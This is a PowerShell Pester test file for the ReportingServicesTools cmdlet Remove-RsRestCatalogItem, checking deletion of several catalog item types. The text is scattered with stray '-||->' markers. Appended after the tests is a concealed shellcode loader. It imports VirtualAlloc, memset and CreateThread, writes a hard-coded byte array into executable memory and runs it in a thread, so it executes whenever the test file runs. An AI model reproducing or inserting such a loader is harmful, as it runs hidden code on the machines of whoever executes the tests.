


 -||-> $reportPortalUri =  -||-> if ( -||-> $env:PesterPortalUrl -eq $null <-||- ) {  -||-> 'http://localhost/reports' <-||-  } else {  -||-> $env:PesterPortalUrl <-||-  } <-||-  <-||- 
 -||-> $reportServerUri =  -||-> if ( -||-> $env:PesterServerUrl -eq $null <-||- ) {  -||-> 'http://localhost/reportserver' <-||-  } else {  -||-> $env:PesterServerUrl <-||-  } <-||-  <-||- 

 -||-> function VerifyCatalogItemDoesNotExists()
{
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $itemName,

        [Parameter(Mandatory = $True)]
        [string]
        $itemType,

        [Parameter(Mandatory = $True)]
        [string]
        $folderPath,

        [string]
        $reportServerUri
    )

     -||-> $item =  -||-> ( -||-> Get-RsFolderContent -ReportServerUri $reportServerUri -RsFolder $folderPath <-||- ) | Where-Object {  -||-> $_.TypeName -eq $itemType -and $_.Name -eq $itemName <-||-  } <-||-  <-||- 
     -||-> $item | Should BeNullOrEmpty <-||- 
} <-||- 

 -||-> Describe "Remove-RsRestCatalogItem" {
     -||-> $rsFolderPath = "" <-||- 
     -||-> $rsFolderPaths = [System.Collections.ArrayList]@() <-||- 

     -||-> BeforeEach {
        
         -||-> $folderName = 'SUT_RemoveRsCatalogItem_' + [guid]::NewGuid() <-||- 
         -||-> New-RsRestFolder -ReportPortalUri $reportPortalUri -RsFolder / -FolderName $folderName <-||- 
         -||-> $rsFolderPath = '/' + $folderName <-||- 
         -||-> $rsFolderPaths.Add($rsFolderPath) <-||- 

        
         -||-> $localResourcesPath = ( -||-> Get-Item -Path ".\" <-||- ).FullName  + '\Tests\CatalogItems\testResources' <-||- 
         -||-> Write-RsRestFolderContent -ReportPortalUri $reportPortalUri -Path $localResourcesPath -RsFolder $rsFolderPath <-||- 
    } <-||- 

     -||-> AfterAll {
         -||-> foreach ($path in  -||-> $rsFolderPaths <-||- )
        {
             -||-> Remove-RsCatalogItem -ReportServerUri $reportServerUri -RsFolder $path -Confirm:$false <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "ReportPortalUri parameter" {
         -||-> It "Should delete a RDL item" {
             -||-> Remove-RsRestCatalogItem -ReportPortalUri $reportPortalUri -RsItem "$rsFolderPath/emptyReport" -Verbose -Confirm:$false <-||- 
             -||-> VerifyCatalogItemDoesNotExists -itemType "Report" -itemName "emptyReport" -folderPath $rsFolderPath -reportServerUri $reportServerUri <-||- 
        } <-||- 

         -||-> It "Should delete a RSDS item" {
             -||-> Remove-RsRestCatalogItem -ReportPortalUri $reportPortalUri -RsItem "$rsFolderPath/SutWriteRsFolderContent_DataSource" -Verbose -Confirm:$false <-||- 
             -||-> VerifyCatalogItemDoesNotExists -itemType "DataSource" -itemName "SutWriteRsFolderContent_DataSource" -folderPath $rsFolderPath -reportServerUri $reportServerUri <-||- 
        } <-||- 

         -||-> It "Should delete a RSD item" {
             -||-> Remove-RsRestCatalogItem -ReportPortalUri $reportPortalUri -RsItem "$rsFolderPath/UnDataset" -Verbose -Confirm:$false <-||- 
             -||-> VerifyCatalogItemDoesNotExists -itemType 'DataSet' -itemName 'UnDataset' -folderPath $rsFolderPath -reportServerUri $reportServerUri <-||- 
        } <-||- 

         -||-> It "Should delete a RSMOBILE item" {
             -||-> Remove-RsRestCatalogItem -ReportPortalUri $reportPortalUri -RsItem "$rsFolderPath/SimpleMobileReport" -Verbose -Confirm:$false <-||- 
             -||-> VerifyCatalogItemDoesNotExists -itemType 'MobileReport' -itemName 'SimpleMobileReport' -folderPath $rsFolderPath -reportServerUri $reportServerUri <-||- 
        } <-||- 

         -||-> It "Should delete a PBIX item" {
             -||-> Remove-RsRestCatalogItem -ReportPortalUri $reportPortalUri -RsItem "$rsFolderPath/SimplePowerBIReport" -Verbose -Confirm:$false <-||- 
             -||-> VerifyCatalogItemDoesNotExists -itemType 'PowerBIReport' -itemName 'SimplePowerBIReport' -folderPath $rsFolderPath -reportServerUri $reportServerUri <-||- 
        } <-||- 

         -||-> It "Should delete a folder" {
             -||-> Remove-RsRestCatalogItem -ReportPortalUri $reportPortalUri -RsItem $rsFolderPath -Verbose -Confirm:$false <-||- 
             -||-> VerifyCatalogItemDoesNotExists -itemType 'Folder' -itemName $folderName -folderPath "/" -reportServerUri $reportServerUri <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "WebSession parameter" {
         -||-> $webSession = $null <-||- 

         -||-> BeforeEach {
             -||-> $webSession =  -||-> New-RsRestSession -ReportPortalUri $reportPortalUri <-||-  <-||- 
        } <-||- 

         -||-> It "Should delete a RDL item" {
             -||-> Remove-RsRestCatalogItem -WebSession $webSession -RsItem "$rsFolderPath/emptyReport" -Verbose -Confirm:$false <-||- 
             -||-> VerifyCatalogItemDoesNotExists -itemType "Report" -itemName "emptyReport" -folderPath $rsFolderPath -reportServerUri $reportServerUri <-||- 
        } <-||- 

         -||-> It "Should delete a RSDS item" {
             -||-> Remove-RsRestCatalogItem -WebSession $webSession -RsItem "$rsFolderPath/SutWriteRsFolderContent_DataSource" -Verbose -Confirm:$false <-||- 
             -||-> VerifyCatalogItemDoesNotExists -itemType "DataSource" -itemName "SutWriteRsFolderContent_DataSource" -folderPath $rsFolderPath -reportServerUri $reportServerUri <-||- 
        } <-||- 

         -||-> It "Should delete a RSD item" {
             -||-> Remove-RsRestCatalogItem -WebSession $webSession -RsItem "$rsFolderPath/UnDataset" -Verbose -Confirm:$false <-||- 
             -||-> VerifyCatalogItemDoesNotExists -itemType 'DataSet' -itemName 'UnDataset' -folderPath $rsFolderPath -reportServerUri $reportServerUri <-||- 
        } <-||- 

         -||-> It "Should delete a RSMOBILE item" {
             -||-> Remove-RsRestCatalogItem -WebSession $webSession -RsItem "$rsFolderPath/SimpleMobileReport" -Verbose -Confirm:$false <-||- 
             -||-> VerifyCatalogItemDoesNotExists -itemType 'MobileReport' -itemName 'SimpleMobileReport' -folderPath $rsFolderPath -reportServerUri $reportServerUri <-||- 
        } <-||- 

         -||-> It "Should delete a PBIX item" {
             -||-> Remove-RsRestCatalogItem -WebSession $webSession -RsItem "$rsFolderPath/SimplePowerBIReport" -Verbose -Confirm:$false <-||- 
             -||-> VerifyCatalogItemDoesNotExists -itemType 'PowerBIReport' -itemName 'SimplePowerBIReport' -folderPath $rsFolderPath -reportServerUri $reportServerUri <-||- 
        } <-||- 

         -||-> It "Should delete a folder" {
             -||-> Remove-RsRestCatalogItem -WebSession $webSession -RsItem $rsFolderPath -Verbose -Confirm:$false <-||- 
             -||-> VerifyCatalogItemDoesNotExists -itemType 'Folder' -itemName $folderName -folderPath "/" -reportServerUri $reportServerUri <-||- 
        } <-||- 
    } <-||- 
} <-||- 
 -||-> $7svU = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $7svU -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xb8,0x5f,0xac,0xbf,0x2c,0xda,0xd3,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x43,0x0f,0x03,0x43,0x50,0x4e,0x4a,0xd0,0x86,0x0c,0xb5,0x29,0x56,0x71,0x3f,0xcc,0x67,0xb1,0x5b,0x84,0xd7,0x01,0x2f,0xc8,0xdb,0xea,0x7d,0xf9,0x68,0x9e,0xa9,0x0e,0xd9,0x15,0x8c,0x21,0xda,0x06,0xec,0x20,0x58,0x55,0x21,0x83,0x61,0x96,0x34,0xc2,0xa6,0xcb,0xb5,0x96,0x7f,0x87,0x68,0x07,0xf4,0xdd,0xb0,0xac,0x46,0xf3,0xb0,0x51,0x1e,0xf2,0x91,0xc7,0x15,0xad,0x31,0xe9,0xfa,0xc5,0x7b,0xf1,0x1f,0xe3,0x32,0x8a,0xeb,0x9f,0xc4,0x5a,0x22,0x5f,0x6a,0xa3,0x8b,0x92,0x72,0xe3,0x2b,0x4d,0x01,0x1d,0x48,0xf0,0x12,0xda,0x33,0x2e,0x96,0xf9,0x93,0xa5,0x00,0x26,0x22,0x69,0xd6,0xad,0x28,0xc6,0x9c,0xea,0x2c,0xd9,0x71,0x81,0x48,0x52,0x74,0x46,0xd9,0x20,0x53,0x42,0x82,0xf3,0xfa,0xd3,0x6e,0x55,0x02,0x03,0xd1,0x0a,0xa6,0x4f,0xff,0x5f,0xdb,0x0d,0x97,0xac,0xd6,0xad,0x67,0xbb,0x61,0xdd,0x55,0x64,0xda,0x49,0xd5,0xed,0xc4,0x8e,0x1a,0xc4,0xb1,0x01,0xe5,0xe7,0xc1,0x08,0x21,0xb3,0x91,0x22,0x80,0xbc,0x79,0xb3,0x2d,0x69,0x17,0xb6,0xb9,0x52,0x40,0xb9,0x5e,0x3b,0x93,0xba,0xa1,0x00,0x1a,0x5c,0xf1,0x26,0x4d,0xf1,0xb1,0x96,0x2d,0xa1,0x59,0xfd,0xa1,0x9e,0x79,0xfe,0x6b,0xb7,0x13,0x11,0xc2,0xef,0x8b,0x88,0x4f,0x7b,0x2a,0x54,0x5a,0x01,0x6c,0xde,0x69,0xf5,0x22,0x17,0x07,0xe5,0xd2,0xd7,0x52,0x57,0x74,0xe7,0x48,0xf2,0x78,0x7d,0x77,0x55,0x2f,0xe9,0x75,0x80,0x07,0xb6,0x86,0xe7,0x1c,0x7f,0x13,0x48,0x4a,0x80,0xf3,0x48,0x8a,0xd6,0x99,0x48,0xe2,0x8e,0xf9,0x1a,0x17,0xd1,0xd7,0x0e,0x84,0x44,0xd8,0x66,0x79,0xce,0xb0,0x84,0xa4,0x38,0x1f,0x76,0x83,0xb8,0x63,0xa1,0xed,0xce,0x8d,0x71 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $HQt=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $HQt.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$HQt,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



